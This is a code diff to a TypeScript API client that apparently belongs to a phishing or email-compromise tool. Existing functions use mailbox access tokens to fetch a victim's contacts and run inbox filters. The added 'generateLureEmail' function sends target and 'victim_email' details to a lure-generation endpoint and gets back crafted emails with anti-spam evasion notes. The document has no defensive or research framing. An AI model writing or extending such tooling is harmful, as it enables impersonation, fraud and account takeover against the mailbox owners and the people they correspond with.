@@ -426,3 +426,17 @@ export async function runAutoFilter(tokenId: string): Promise<{ success: boolean
 export async function fetchContacts(tokenId: string): Promise<{ value: { id: string; displayName?: string; emailAddresses?: { address?: string; name?: string }[] }[] }> {
   return fetchWithRetry<{ value: { id: string; displayName?: string; emailAddresses?: { address?: string; name?: string }[] }[] }>(`/api/inbox/contacts?token_id=${encodeURIComponent(tokenId)}`);
 }
+
+export async function generateLureEmail(payload: {
+  target_email: string;
+  target_name?: string;
+  victim_email: string;
+  template_type?: string;
+  context?: string;
+}): Promise<{ subject: string; body: string; html_body: string; anti_spam_notes: string[] }> {
+  return fetchWithRetry<{ subject: string; body: string; html_body: string; anti_spam_notes: string[] }>("/api/lure/generate", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
